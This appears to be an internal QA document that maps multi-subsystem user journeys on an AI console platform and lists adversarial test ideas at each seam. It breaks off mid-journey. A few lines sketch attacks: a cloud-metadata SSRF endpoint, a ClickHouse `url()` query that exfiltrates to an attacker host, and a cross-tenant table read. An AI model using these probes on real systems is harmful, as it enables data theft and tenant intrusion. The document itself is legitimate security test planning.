# End-to-End User Journey Map — Seams & Adversarial Attack Points

**Purpose:** Map the console's KEY MULTI-SUBSYSTEM USER JOURNEYS so adversarial QA can attack them cluster by cluster. This is the HIGH-LEVEL flow map; domain-specific adversarial passes (chat, gateway, pipelines, data, governance, settings, builder, tenant-isolation) are in `docs/QA_TEST_LOG.md` + domain docs. This file surfaces the SEAMS between subsystems where one hands state to another — the "each piece passed but the feature broke between them" class of defects.

**Subsystems:** gateway (LLM proxy, model routing, rate-limit), pipeline (contract, governance, guardrails, evals), data (connectors, knowledge, warehouse, ETL), storage (chat, app-runs, audit, artifacts), triggers (webhook, schedule, email, on-demand), HITL (human review, approval, resume), consumption (sink output: console/email/report/whatsapp), chat, builder (Studio, Canvas, NL compiler), governance (policy, ABAC, provisioning), observability (audit, traces, cost, drift, lineage).

**Method:** For each journey, the ordered STEPS, the SUBSYSTEM SEAMS (the hand-off points), the TERMINAL ARTIFACT a user perceives, the FAILURE EDGES worth attacking hardest (restart, retry, partial failure, cancel, relaunch, provider failure, cross-org/cross-app mid-flow).

---

## Cluster 1: BUILD→RUN→REVIEW→REPORT — Non-tech user builds an app in NL, runs it, hits HITL, approves, sees report

**Actors:** non-technical business user (no code), app author; optionally approvers (HITL reviewers).

### Journey 1.1: NL→Guided build→Run inline→See result

**Steps:**
1. **Studio home** (`/build/studio`) — user sees list of built apps + "New app" CTA.
2. **Guided builder** (`/build/studio/new/...` — full-screen, not modal) — user describes the task in plain language ("approve a reimbursement: read the invoice, check the employee's expense quota, decide eligibility").
3. **NL compile** → `POST /api/v1/admin/apps/compile` (lib/app-compile.ts) **→** AppSpec { steps: [agent | connector-query | guardrail | human | output], trigger, inputForm, edges }.
4. **Canvas preview + edit** (read/edit mode) — user sees the compiled steps as nodes; clicks through to review/tweak each (agent prompt, connector binding, guardrail rule, human form).
5. **Save draft** → `POST /api/v1/admin/apps` (AppSpec persists to `apps` table, published=false).
6. **Input form** — app requests input (if inputForm declared); user provides values (keys, defaults, validation).
7. **Run inline** → `POST /api/v1/app/[slug]/run?mode=live` (or mode=shadow for dry-run) — lib/app-run.ts executes the steps in order:
   - **Step execution seam 1 (Agent step → runAgent):** the agent step calls the GOVERNED single-agent pipeline (policy gate → guardrails(in) → retrieve → answer → ground → guardrails(out) → sign). Output threaded to downstream steps.
   - **Step execution seam 2 (Connector-query step → queryDomain):** the connector step resolves the named data-domain (lib/data-domains.ts → lib/adapters/connector-query.ts) → hits the bound connector → returns a result (or null on miss).
   - **Step execution seam 3 (Guardrail step → runChecks):** mid-pipeline guardrail (PII/injection/toxicity) run on accumulated context; if blocked, step fails + run halts.
   - **Step execution seam 4 (Human step → HITL):** run pauses at the human node (awaiting_human status); Temporal workflow (if enabled) holds the execution; user sees the run in the review inbox.
   - **Step execution seam 5 (Output step → sink):** output sink (console, email, report, whatsapp) fires (or is intercepted in shadow mode).
8. **Run completed** (status: done | error | awaiting_human | cancelled) → AppRun row persisted to DB with trace.
9. **Results view** (`/app/[slug]/runs/[id]`) — user sees the trace (each step + its output) + terminal outcome + any artifacts (generated report, email sent).

**Subsystem seams crossed:**
- NL compiler → app-model (AppSpec abstract validity assumed, not runtime-tested).
- Builder → persistence (draft app saved but published=false; user can run private drafts).
- Studio → execution (canvas edit not validated to runtime-executable spec; drift between editor state + executor expectation).
- Agent step → pipeline (bound pipeline contract resolved; egress leash + data-allowlist enforced; guardrails run).
- Connector step → data layer (domain lookup, connector fetch, query execution, result masking).
- Guardrail step → governance (policy/ABAC overlay applied; PII masking can escalate).
- Human step → HITL subsystem (run paused, awaiting signal; temporal workflow manages state).
- Output step → sink adapter (email/report/whatsapp provider selected; masking rules applied; delivery attempted).
- Run completion → audit/lineage (run signed, traced, exported; cost accrued).

**Terminal artifact:** An AppRun row with status (done | error | awaiting_human), steps trace, outcome string, optional artifacts (report PDF, email log, provenance signature).

**Failure edges (highest-value attacks):**
1. **Cross-org data leak via connector step** — connector query step resolved from org context, but ORG SCOPE NOT threaded through the queryDomain seam. A multi-org user switches orgs mid-run, or a connector is shared across orgs → live query hits the WRONG org's database. *Attack:* multi-org user, switch org mid-run, hit data-connector step.
2. **HITL resume rebuilds state from OLD spec, drives CURRENT spec** (G-ADV-BUILD-3) — a run pauses at a human step on spec version N; operator edits the app (adds a sink step) while the run is paused; operator approves the run → executor uses the CURRENT (edited) spec, not version N → added sinks fire for an unchanged input (duplication, side-effects). *Attack:* edit app while run awaiting_human, approve.
3. **Cyclic app wedges forever** (G-ADV-BUILD-1/2) — an app with a cycle (agent→connector→agent) saves + runs; at runtime, cyclic steps stay queued forever, never complete. Validator checks reachability, not acyclicity; pure rule exists only in canvas editor. *Attack:* cycle in node graph, save, run.
4. **Shadow mode not enforced on all sinks** — email/report sinks intercepted, but custom/extensible sinks may bypass the shouldIntercept check. *Attack:* custom sink in shadow mode, verify it executes vs is intercepted.
5. **Partial failure mid-run, run abandoned** — a step throws (connector down, model unreachable); the run records the error, but the awaiting_human status is never set + no notification fires. User never sees the run needs attention. *Attack:* kill connector mid-run, await human never signals, run orphaned in error state.
6. **Egress leash not enforced on agent steps** (G-ADV-PIPE-1) — bound pipeline declares egress:local + forceLocal:true, but a PII-locked pipeline defaults to gpt-4o (cloud). Agent step runs with the pipeline's contract, but the EGRESS DECISION is advisory only (metadata.egress, not enforced on gatewayAnswer). *Attack:* local-egress pipeline, agent step calls cloud model, verify egress reporting vs actual routing.

---

### Journey 1.2: Build→Publish→Schedule trigger→Async run→Review inbox→Approve→Report

**Steps:**
1. **Published app** — user sets published=true on an existing draft app.
2. **Trigger bind** (edit app's `trigger` field) — user selects a trigger kind (schedule: cron, webhook: token generation, email: imap config, on-demand: default).
3. **Schedule example:** cron="0 9 * * 1" (every Monday 9am) — stored in app.trigger.
4. **Schedule fires** → `/worker/agent-run.workflow.ts` OR on-prem trigger adapter (email poller, webhook receiver) → fires `POST /api/v1/app/[slug]/run?trigger=schedule` with trigger payload.
5. **Async execution** (if OFFGRID_QUEUE_ENABLED=1) → `Temporal.enqueueRun(AppRunWorkflow)` → workflow activities (executeStep, pause on human). If QUEUE disabled, inline execution (same path, direct result).
6. **Run paused at human step** → status awaiting_human; workflow signals Temporal to hold (condition on human approval).
7. **HITL review inbox** (`/app/[slug]/review?status=awaiting_human`) — approver sees run + context (prior steps' outputs, the pending decision + form).
8. **Approver reviews, approves** → `PUT /api/v1/admin/app-runs/[id]/approve` (agent-run-actions.ts) → signals workflow to resume.
9. **Workflow resumes** → executeStep on downstream steps (rest of the spec) → completes.
10. **Report export** → `GET /api/v1/admin/app-runs/[id]/report` → PDF (uses pdf.ts + reports.ts, can include provenance signature).
11. **Audit + cost** — run persisted with trace + signed provenance; FinOps cost accrued; audit log entry written.

**Subsystem seams crossed:**
- App.trigger → trigger adapter (schedule fires, webhook endpoint lives, email poller runs).
- Trigger adapter → app-run executor (payload injected as input; run initiated in org context).
- Executor → Temporal durable workflow (if enabled; activity calls executeStep; workflow manages pause/resume).
- HITL signal → workflow condition (approver action signals a Temporal update, condition releases the hold).
- Downstream steps → prior step outputs (steps are NOT replayed; executor has the state from the pause point).
- Run completion → report generation (run trace + provenance converted to PDF; optional C2PA/sigstore attestation).
- Run → audit/siem (async fanout via `after()` next/server; audit events written; drift/eval scores computed).

**Terminal artifact:** AppRun with status done | error + report PDF + audit entries + FinOps cost line.

**Failure edges:**
1. **Trigger misfires or never fires** — schedule cron not validated server-side (client only); invalid cron (*/0, out-of-range) saves, silently never fires (Kestra rejects at deploy, not 1st-stage UI). *Attack:* cron="*/0 * * * *", save, verify it never fires + no error.
2. **Temporal worker down mid-run** — workflow executing a step, worker restarts. If the step is idempotent (connector query), rerun is safe; if side-effecting (email sink), rerun duplicates. *Attack:* kill worker mid-step, observe rerun behavior.
3. **Approval signal lost / race condition** — approver clicks approve; concurrent request also patches the run; the second approval signals the workflow to RESUME AGAIN (double-resume). *Attack:* concurrent approvals, verify no double-resume / double-exec of downstream steps.
4. **Report generation omits provenance** — report PDF exports trace + outcome, but provenance signature is NOT bound into the PDF or as a detached manifest. Auditor cannot verify the exported report's authenticity. *Attack:* export report, verify detached manifest or embedded signature is present.
5. **Cost not accrued if run orphaned** — if the run errors + is abandoned mid-step, the final cost-accrual fanout (after()) never fires (was already queued). Pipeline's FinOps ledger is out-of-sync. *Attack:* error mid-run, check FinOps ledger vs audit log for missing entries.
6. **Cross-org approval race** — org A's approver fetches run ID from org B (via IDOR or shared namespace); approves it. *Attack:* multi-org users, approver fetches and approves a run from a different org.

---

## Cluster 2: CONSUMPTION loop — Webhook/email/schedule trigger → governed pipeline run → guardrail in → model via gateway → sink out (Resend)

**Actors:** external system (webhook caller, email sender), Off Grid operator (configures adapters).

### Journey 2.1: External webhook → App input → Run → Email sink → Resend delivery

**Steps:**
1. **Webhook trigger created** (`/control/integrations` OR `POST /api/v1/admin/webhook-triggers`) — operator creates a trigger bound to an app; system generates opaque token + stores signed secret in OpenBao.
2. **External system calls webhook** → `POST /api/v1/triggers/[token]` (external route, unauthenticated).
3. **Webhook auth seam** (webhook-trigger-policy.ts) — `verifyWebhookAuth(token, HMAC-signature, timestamp, nonce)` (pure) → nonce claimed in DB (replay defence) → verdict: allow | deny-reused-nonce | deny-outside-window | deny-bad-sig.
4. **Payload sanitize** (trigger-dispatch.ts) → top-level size check (5MB hard cap); nested structures NOT clamped (G-ADV-BUILD-5: a deep 5000-element array passes through).
5. **App run fire** → `POST /api/v1/app/[slug]/run` with trigger=webhook + payload.
6. **Executor path:**
   - **Pipeline contract resolved** (app.pipelineId or org default).
   - **Step 1: connector-query** → data-domain lookup → connector fetch → governed READ (enforceDataAccess checks pipeline allowlist) → query executed → rows masked (PII masking) → result threaded to next.
   - **Step 2: agent** → runAgent() path (policy gate → guardrails(in) → retrieve → answer → ground → guardrails(out) → sign).
   - **Step 3: output (email)** → selectEmailProvider(orgId, pipeline) (email-sink-governance.ts) → checks emailEgressVerdict (cloud email allowed?) → maskEmailForSend(content, pipeline) → format HTML body.
7. **Email sink dispatch** → adapter mapped by OFFGRID_ADAPTER_EMAIL_SINK (default: Resend provider) → `POST https://api.resend.com/emails` with auth header.
8. **Delivery response** → StepResult persisted (status: done | error); if error, retry logic (linear backoff, max 3 retries in the step executor, or Temporal activity retry if durable).
9. **Run completed** → trace persisted, audit entries written, cost accrued.

**Subsystem seams crossed:**
- External system → webhook auth (token lookup, HMAC verify, nonce check).
- Webhook route → app-run executor (payload becomes the run input; org inferred from token).
- App.pipelineId → contract resolver (null fallback to org default).
- Contract → data enforcement (allowlist check before connector hit).
- Connector result → masking (PII masking runs on rows, escalated by policy overlay).
- Agent output → email content (answer text + citations formatted into email HTML).
- Email provider selector → Resend API (egress decision: allowed to cloud email?; endpoint + credentials from config/vault).
- Email dispatch → retry queue (if Resend times out or 5xx, step marked error; executor may retry inline or via durable activity).

**Terminal artifact:** Email delivered to recipient (if allowed) + run trace in the console + audit log.

**Failure edges:**
1. **Cross-tenant token reuse** — webhook token is org-scoped in the DB row, but the token lookup (webhook-triggers.ts:read by token only) skips org_id. A token created in org A is claimed in org B's nonce table → both orgs' runs consume the same rate-limit / auth state. *Attack:* multi-org setup, create token in org A, call it from org B.
2. **Egress check on cloud email missing org context** (selectEmailProvider assumes orgId is known; if inferred wrongly, email config crosses orgs). *Attack:* webhook payload with ambiguous org, trace email to wrong org's provider account.
3. **Nested payload explosion bypasses top-level clamp** (G-ADV-BUILD-5) — webhook payload is `{a: {b: {c: ... 5000 deep nested array}}}` → passes sanitizeBody (only top-level size checked) → when serialized into agent context, balloons the request to the gateway → OOM or timeout. *Attack:* deeply nested/array-heavy webhook payload, verify it's clamped.
4. **PII masking escalation fails open** (G-ADV-GOV-4) — masking rule throws (detection service down); the mask catch returns UNMASKED content + forwards raw to the model. *Attack:* masking service down, verify email body is NOT redacted.
5. **Connector down mid-run, retry orphaned** — executor retries the connector-query step N times; on final failure, the run is marked error but the email sink is NOT skipped (it fires with empty/fallback data). *Attack:* connector down, webhook fires, verify email is sent with degraded data or not sent at all (per policy).
6. **Email sender domain spoofing** — Resend integration allows an arbitrary `from` domain if the org owns it (verification at Resend, not console validation). Operator misconfigures → emails fail SPF/DKIM. *Attack:* Resend integration with invalid domain, verify delivery failure is surfaced.
7. **Partial delivery across multiple email steps** — app has multiple email output steps (step 1 to finance team, step 2 to manager). Step 1 succeeds, step 2's email addr is invalid → step 2 fails. Run marked error overall. Approver sees error; finance already got the email. *Attack:* app with 2 email sinks, 2nd sink fails, verify outcome is error + step trace shows which sank succeeded.

---

### Journey 2.2: Scheduled trigger (cron) → runs every interval → batched runs visible in insights

**Steps:**
1. **App with schedule trigger** — user creates/edits app, sets trigger={kind:'schedule', cron: '0 9 * * MON'}.
2. **On-prem schedule adapter** (lib/adapters/triggers/schedule.ts) — fires the cron:
   - If OFFGRID_QUEUE_ENABLED: enqueues AppRunWorkflow to Temporal at the scheduled time.
   - Otherwise: direct inline call to `POST /api/v1/app/[slug]/run?trigger=schedule`.
3. **Run executes** (same path as webhook, no input needed if app.inputForm is empty or prefilled).
4. **Multiple runs batch** — over a day/week, cron fires N times → N AppRun rows created.
5. **Insights / observability** (`/insights/apps/[id]/runs`) — user sees list of runs from this schedule, grouped by date + status (done | error | awaiting_human).
6. **Drift detection** (lib/qa/drift.ts, scheduled by `/admin/qa/sweep`) — observes the run outcomes over time; if error rate rises or quality score drops, alerts (via Langfuse or native PSI).

**Subsystem seams crossed:**
- Schedule definition → cron validator (isValidCron accepts some invalid crons like */0).
- Cron fire → trigger adapter (on-prem poller or Temporal scheduler).
- Trigger payload → app-run (empty or prefilled input depends on inputForm config).
- Runs → observability store (appRuns persisted; FinOps cost summed; Langfuse scores sent if online-evals enabled).
- Run outcomes → drift analysis (past N run scores vs baseline; PSI / mean-degradation computed).

**Terminal artifact:** AppRun rows + insights dashboard showing trend + drift alert (if any).

**Failure edges:**
1. **Invalid cron saves, silently never fires** (G-ADV-DATA-3, extended) — cron="88 * * * *" or "* * * * 7" (day-of-week out of range) saves without error; Kestra scheduler rejects at deploy, not UI validation. User waits for a run that never arrives. *Attack:* invalid cron, save, wait an interval, verify no run fires + no error message.
2. **Cron fires during Temporal worker downtime** — schedule is managed by Temporal scheduler; if all workers are down, the activity never runs. When workers come back up, the missed runs are NOT replayed (Temporal has an optional catchup mode, likely disabled in prod). *Attack:* disable Temporal workers, wait past scheduled time, bring workers back, verify no catchup of missed run.
3. **FinOps double-count on retry** — if the same run is retried (activity timeout + retry), the cost is recorded twice (once per activity invocation). *Attack:* force activity timeout mid-run, verify cost ledger has N+1 entries for N+1 attempts.
4. **Drift analysis skips a run** — observability fanout (after()) fails silently; the run is persisted but never reaches Langfuse. Drift analysis excludes that run → trend analysis has gaps → false clean verdict. *Attack:* Langfuse down, run fires, check drift analysis on next sweep (should skip the missing run gracefully or alert).

---

## Cluster 3: DATA→GROUNDING — Connector → ETL/warehouse → knowledge/RAG ingest → chat/app grounds an answer + cites

**Actors:** operator (configures connectors + ETL), chat/app user.

### Journey 3.1: Operator sets up data → connector sync → warehouse → Brain ingest → user queries → answer + citations

**Steps:**
1. **Register connector** (`/data/connectors` → create) → select type (PostgreSQL, MySQL, REST, S3…) → provide endpoint + auth → test connection (live query to verify reachability).
2. **Connector persisted** (connectors table) → secret stored in OpenBao (only secret_ref stored in the row).
3. **Declare data-domains** (lib/data-domains.ts) → operator names each domain (e.g., "Policies", "Claims") + binds a connector + resource (table, collection, endpoint path) + op-hints (aggregation rules, for connectors with complex schemas).
4. **ETL job definition** (Builder → ETL tab OR `/data/jobs`) — operator defines a DAG:
   - Source node: select connector + domain.
   - Transform node: derive columns, filter, aggregate (expression validation: client-side only, G-ADV-DATA-ETL-3).
   - Warehouse destination: ClickHouse table.
   - Schedule: cron (validated weakly, G-ADV-DATA-ETL-4).
5. **ETL job deployed to Kestra** (lib/adapters/kestra.ts) — DAG compiled to Kestra YAML; validateDagSpec runs (checks reachability, node type validity) but does NOT run server-side (only client + Kestra at deploy, G-ADV-DATA-ETL-1).
6. **ETL runs on schedule** → Kestra executes the flow → reads from connector → transforms → writes to warehouse (ClickHouse).
7. **Brain ingest** (operator pushes documents to Brain OR ETL pipes to Brain adapter) → chunks + embeds + indexes with provenance (source connector + schema).
8. **User asks a question** (chat or app agent) → retrieval router (lib/retrieval/router.ts) → four sources: KB, database (warehouse connector source, G-ADV-DATA-7), tool, Brain → retrieve contexts + rank → answer.
9. **Answer + citations** — LLM answers from retrieved sources; grounding check (faithfulness score via LLM-as-judge) runs async; citations list source document + snippet.

**Subsystem seams crossed:**
- Connector register → vault secret storage (auth persisted separately, only ref in DB).
- Data-domain definition → retrieval router (router must recognize the domain name to hit the connector source).
- ETL DAG → Kestra compile (validateDagSpec pure, Kestra's validation at deploy is 2nd-stage).
- Warehouse writes → knowledge ingest (ETL → Brain adapter; or operator manually pushes Brain docs).
- Brain docs → retrieval ranking (embeddings + keyword match scored, top-K returned).
- Retrieved contexts → LLM grounding (sources formatted as [1] source: snippet; answer checked against them).

**Terminal artifact:** Chat message with answer + citations + grounding score (faithfulness) + audit log entry.

**Failure edges:**
1. **Cross-tenant data leak in retrieval** (G-ADV-CHAT-1) — chat_documents / chat_chunks have NO org_id column; retrieve() filters by project_id only. A multi-org user in orgs A and B opens a chat in org A, pointed at org B's project → retrieve() returns org B's docs inside org A's chat. *Attack:* multi-org user, cross-tenant chat binding, verify leaked documents.
2. **DAG with invalid references saves + runs as empty** (G-ADV-DATA-ETL-1, extended) — ETL DAG references a non-existent connector or has a cycle; validateDagSpec is client-only, skipped on PATCH. Job runs, Kestra compiles to 0 steps, completes as "success" (no error reported). *Attack:* DAG with circular edge or missing connector, PATCH + run job, verify false success.
3. **Warehouse reads have no tenant isolation** (G-ADV-DATA-5) — `queryWarehouse()` / warehouse table routes do NOT scope to org; isSafeIdentifier permits `db.table` syntax → `SELECT * FROM other_org_db.accounts`. *Attack:* warehouse query across tenant databases.
4. **Connector SSRF / metadata exfil** (G-ADV-DATA-2, extended) — validateConnectorCreate checks endpoint against 169.254.169.254 / localhost / RFC-1918, but test/sync/resources then connects server-side + returns the response to the caller. A crafted endpoint like `http://169.254.169.254/latest/meta-data/` exfils cloud metadata. PATCH runs zero validation. *Attack:* set connector endpoint to cloud metadata URL, fetch it.
5. **Guardian read-guard allows table functions** (G-ADV-DATA-1) — guardReadOnlySql permits ClickHouse table functions `url()`, `file()`, `s3()`, `mysql()`, `postgresql()` in a SELECT → operator "read" query exfils via `url()` to an attacker-controlled endpoint. *Attack:* warehouse query with `SELECT ... FROM url('http://attacker-ip/')`, verify exfil.
6. **Brain ingest misses org scope** (G-ADV-DATA-9) — lineage namespace is global, all orgs co-mingled (no org_id on lineage records). ETL job from org A writes lineage; operator in org B can see it. *Attack:* multi-org ETL, verify lineage visible cross-org.
7. **Knowledge retention not enforced** (G-ADV-DATA-6) — policies define a retention window (dueForDisposal computed), but NO consumer purges the docs at expiry. Classified docs stay in Brain / warehouse indefinitely. *Attack:* set a short retention window, wait past it, verify docs still exist.

---

## Cluster 4: GOVERNANCE SET-ONCE-INHERITED — Admin sets a policy/guardrail/eval once at org/pipeline scope → it is ACTUALLY enforced across EVERY consumer (chat, agent, app, provisioned API)

**Actors:** compliance/security admin (sets policy), business users (inherit it everywhere).

### Journey 4.1: Admin sets org-default policy → every run enforces it (chat, agent, app) without per-consumer reconfiguration

**Steps:**
1. **Control plane policy definition** (`/control/policy` OR `POST /api/v1/admin/policy`) — admin toggles egress switch (cloud allowed?), adds guardrails (PII-input, injection-scan, grounding, custom), lists allowed models.
2. **Policy published** (version bumped; policy becomes the org default).
3. **Fleet nodes poll** (every ≤60s) — `/api/v1/gateway/config` returns the current org policy.
4. **Chat message** — user in the org sends a chat message:
   - **Policy gate seam** (chat-pipeline-policy.ts) — message checked against org default policy (egress leash, guardrails, allowed models).
   - If cloud egress OFF but message classified PII → blocked (or local-only enforced).
   - Guardrails run (inbound).
5. **Agent run** (standalone or from app) — same policy gate applies (lib/pipeline-enforcement.ts enforceModelCall).
6. **App run** (any step with a model call) — pipeline.policyOverlay merges with orgPolicyDefaults; net effect enforced.
7. **Provisioned API** (external 3rd party via issued key) — API key tied to an org + optional budget; policy enforcement applies to that org's policy (via gateway routing rules).

**Subsystem seams crossed:**
- Policy definition → gateway config endpoint (published policy delivered to all consumers).
- Policy → chat pipeline (policy gate on every message, no opt-out).
- Policy → agent run (enforced in runAgent path, before any model call).
- Policy → app run (enforced via pipeline.policyOverlay merge, per pipeline + app combination).
- Policy → provisioned API (API key org → org policy, enforced at gateway).

**Terminal artifact:** Every run (chat, agent, app, API) shows the enforced policy + checks in the audit log.

**Failure edges:**
1. **Deprecated pipeline still governs** (G-ADV-PIPE-2) — operator archives or deprecates a pipeline (lifecycle status = DEPRECATED); apps/agents/chat still bound to it. resolveContract/getPipeline skip lifecycle status → deprecated pipeline still enforces its (stale) rules. "Fall back to org default" promise never fires. *Attack:* bind app to a pipeline, deprecate pipeline, run app, verify it still uses deprecated rules.
2. **Draft pipeline runs live on internal consumers** (G-ADV-PIPE-3) — operator creates a pipeline, publishes as DRAFT (publish=false). Chat/agent/app (internal consumers) skip the published check; only the PUBLIC `/api/v1/pipeline/[id]/run` route enforces it. Draft pipeline governs internal runs, bypassing review. *Attack:* draft pipeline, bind an app, run it, verify it executes (should reject if pipeline not published).
3. **Policy enforcement applied ad hoc per path** (root cause across multiple domains) — chat.ts, app-run.ts, agentrun.ts each have slightly different policy-gate logic. One path swallows a policy check on error (e.g., guardrail fails open in chat, fails closed in agent). *Attack:* guardrail service down, run chat vs agent, verify they handle the error consistently.
4. **Guardrail overlay merge is not tightening-only** — a pipeline's guardrailOverlay should ONLY tighten the org defaults (e.g., require masking if default allows). If merge logic is bidirectional, a pipeline can LOOSEN a locked org control. *Attack:* org policy locks masking=true, pipeline sets masking=false, run app, verify masking still applies.
5. **Per-user override not blocked** — users are NOT meant to bypass org policy per message (chat, app). If the UI exposes a "skip guardrail" toggle or a per-message policy override, the "set once, inherited everywhere" promise breaks. *Attack:* search for client-side toggles that bypass policy; if found, verify they don't actually bypass server-side checks.

---

## Cluster 5: ADMIN-SETUP→OPERATOR-USE — Admin binds pipeline/gateway/policy + provisions access → business user builds+runs inside those rails; role transitions (admin vs viewer vs writer)

**Actors:** platform admin, business operator (project lead), viewers (read-only).

### Journey 5.1: Admin provisions a pipeline + team access → operator builds an app → operator + team members run it with inherited rules

**Steps:**
1. **Admin setup** (`/control` → Policy, Model routing, Gateway, ABAC) — sets org-wide rules + selects a gateway (on-prem cluster, OpenAI, Anthropic).
2. **Pipeline definition** (`/pipelines` → New) — admin creates a reusable pipeline:
   - Bind gateway + model routing rules.
   - Set data allowlist (which domains this pipeline can touch).
   - Policy overlay (tighten org defaults).
   - Guardrail overlay.
   - Evals + golden set.
3. **Team creation** (`/workspace/teams` OR RBAC) — admin creates Team A, assigns members (operator + other team members).
4. **Pipeline delegated to team** (pipelines.team_id = Team A's id) — only Team A members can create/edit/run apps on this pipeline.
5. **Operator (Team A member) builds an app** (`/build/studio`) — author a multi-step app; at save, app.pipelineId is set to Team A's default pipeline (or operator picks from the available set).
6. **Operator publishes the app** → makes it available to Team A members (visibility: private | team | org).
7. **Team member (viewer role) opens the app** → if visibility=team, can RUN the app (POST /api/v1/app/[slug]/run) but NOT edit it (PUT requires writer | owner).
8. **App runs** — each step enforces the bound pipeline's contract (data allowlist + policy + guardrails) + the team member's own budget/FinOps limits (if delegated keys are issued).
9. **Audit trail** — every run is stamped with the invoker's identity (team member, via auth claim) → audit log shows who ran what + the outcome.

**Subsystem seams crossed:**
- Admin policy → pipeline definition (policy overlay merged with org defaults).
- Team membership → access control (RBAC: viewer | writer | admin; ABAC: fine-grained resource + attribute rules).
- App.pipelineId → contract enforcement (at run time, pipeline rules apply).
- Team member identity → FinOps budget (budget scoped to team member + key, consumed per run).
- Run invocation → audit (caller identity + run details logged).

**Terminal artifact:** App runs successfully, audit log shows the team member as the caller, FinOps cost deducted from their budget.

**Failure edges:**
1. **Viewer can write via API bypass** — UI enforces role-based visibility (viewer sees read-only button), but API routes do NOT check requireAdmin / requireWriter. A viewer POST-ing to /api/v1/admin/apps/[id] succeeds. *Attack:* viewer account, direct curl to app edit route, verify 401 (should fail).
2. **Team pipeline accessible by non-members** — pipelines.team_id is set, but resolveContract (or the pipeline fetch) does NOT scope to the requesting user's team membership. A user can list + bind pipelines outside their team. *Attack:* create 2 teams, operator in team 1 tries to bind team 2's pipeline, verify access denied.
3. **Budget enforcement per key, not per run** — a team member is issued a key with $10 budget; they run the app twice ($6, $8 spent respectively) → 2nd run should fail on budget exhaustion, but does NOT if the budget is checked only on key creation, not per-run. *Attack:* key with low budget, run app until budget exceeded, verify run is rejected.
4. **ABAC deny rule can't override RBAC allow** — RBAC says "viewer can read", ABAC says "nobody reads PII data". If an app read step touches a PII domain, the viewer should be denied. If RBAC is checked first (allow) + ABAC is skipped, the viewer leaks PII. *Attack:* viewer + PII domain, app data-connector step, verify access denied.
5. **Delegated keys cross-org** (G-ADV-GW-9, extended) — API key generation passes ownerOrg to Keycloak unvalidated. A key issued for org A can be used to access org B's pipelines (if the key's org_id is rewritten). *Attack:* mint key in org A, attempt API call to org B endpoint with org A's key, verify 401.

---

## Cluster 6: INTERRUPT/RECOVERY — Run cancelled mid-stream, gateway degraded mid-run, guardrail engine down mid-turn, HITL never resumed, Temporal worker restart mid-run, tenant switch mid-session

**Actors:** user (interrupted), system (degraded), operator (recovery).

### Journey 6.1: App run mid-step, user cancels (or network fails)

**Steps:**
1. **App run started** → executor enters loop: executeStep → persists StepResult.
2. **Step executing** (e.g., agent.ts:runAgent calling gatewayAnswer → fetch to GATEWAY_URL).
3. **User cancels** (browser Back, X button, or network drops) → fetch AbortSignal fires.
4. **Executor response:**
   - If inline (no Temporal): fetch aborts, gatewayAnswer catches + returns null → agent run marked error → subsequent steps skipped (or executor halts).
   - If durable (Temporal): activity is in-flight, AbortSignal doesn't reach it. Activity completes on the gateway's timeline, result is recorded even after the browser fetch times out.
5. **Run state:** AppRun row persists with status error | done (depending on whether the step succeeded server-side). Browser never sees the result if it cancelled early (no streaming back).
6. **Retry:** User re-runs the app. New AppRunId, independent run (no idempotency key on app runs).

**Subsystem seams crossed:**
- Browser signal → executor (AbortSignal timeout on fetch, but not on Temporal activity).
- Executor state → DB persistence (run is persisted regardless of browser disconnect).
- Run error → downstream steps (if in-flight at cancel, they may or may not be skipped, depending on the state persisted).

**Terminal artifact:** AppRun in error state (or done, if server-side activity completed) + incomplete trace.

**Failure edges:**
1. **Run persists even if user never sees result** — activity succeeds, result queued to be persisted, but browser closes before the response is sent. Server persists the full result; user has no trace (except in the console). This is acceptable (server is source of truth), but the user may re-run the same input, causing duplication. *Attack:* kill browser mid-stream (or HTTP/2 RST_STREAM), verify run is persisted, retry the run, observe 2 appRun rows with the same trigger + input.
2. **Temporal activity not cancelled on browser abort** — if OFFGRID_QUEUE_ENABLED=1, the activity is in-flight at the Temporal worker, and the browser abort doesn't reach it. The activity runs to completion (possibly side-effecting — firing an email sink), even though the user cancelled. *Attack:* enable Temporal, start app run with email sink, kill browser before email fires, verify email was still sent.
3. **Step persisted mid-execution** — if the network fails while the executor is persisting a StepResult, the row may be partially written (if the DB connection dies mid-transaction). Subsequent runs may re-execute the same step (no idempotency key), or skip it (if marked done). *Attack:* kill DB connection mid-step persist, observe run state.
4. **Durable workflow re-executes on restart** — a Temporal workflow is executing step 3 of 5; the worker is killed. When the worker restarts, it re-executes the workflow from the last checkpoint. Step 3 is idempotent (connector query) → safe. Step 2 was a side-effecting email sink → email sent twice. *Attack:* kill worker mid-step, restart worker, verify emails/side-effects.

---

### Journey 6.2: HITL resume never signalled, run orphaned in awaiting_human

**Steps:**
1. **App run pauses at human step** → status awaiting_human; Temporal workflow condition waits for signal.
2. **Approver intended to review** — notification email sent (or inbox shows pending), but approver never sees it (email lost, inbox not checked).
3. **Days pass** — run stays in awaiting_human state, no timeout (workflow condition is indefinite).
4. **Operator discovers orphaned run** (audit/observability) — run is weeks old, status never resolved.
5. **Recovery:** Operator must CANCEL the run (DELETE or mark status=cancelled) + re-trigger.

**Subsystem seams crossed:**
- HITL step → Temporal signal (workflow waits for a signal to resume).
- Approval notification → email/Slack/in-console alert (no retry if email lost).
- Run state → timeout or TTL (no automatic expiry; run waits indefinitely).

**Terminal artifact:** Orphaned AppRun in awaiting_human, no automatic cleanup.

**Failure edges:**
1. **No timeout on HITL pause** — Temporal workflow condition has no deadline. If the approver never acts, the run is stuck forever, holding resources (DB row, Temporal execution state). A runaway HITL pause can accumulate. *Attack:* app with human step, never approve, check for accumulating awaiting_human runs + Temporal workflow queue size growth.
2. **Approval notification single-attempt** — email sent once; if lost, no retry. Approver is never notified. Contrast: a critical system would retry the notification, add a digest/rollup, Slack integration, or in-console banner. *Attack:* kill email delivery for a specific approver, trigger app with human step, verify no notification retry.
3. **Resume signal not idempotent** — approver clicks "Approve" twice (or concurrent requests); both signals fire to the workflow. If the workflow condition resumes on EACH signal, downstream steps execute twice. *Attack:* double-submit approval (concurrent requests), verify no double-execution.
4. **Cascading downstream pauses** — app has 2 human steps (step 3 human, step 5 human). If step 3 pauses forever, the user never reaches step 5. Both are awaiting_human, but step 5 depends on step 3 completing. *Attack:* app with 2 human steps, cancel step 3's approval, verify step 5 never resumes.

---

### Journey 6.3: Gateway model unreachable mid-run, fallback to cloud (or block, if leashed)

**Steps:**
1. **App agent step calls gatewayAnswer** → fetch to GATEWAY_URL:4000/v1/chat/completions.
2. **Gateway unreachable** (worker down, network latency, 5xx error) → fetch times out or errors.
3. **Executor path:**
   - Catch block returns null (gatewayAnswer.catch).
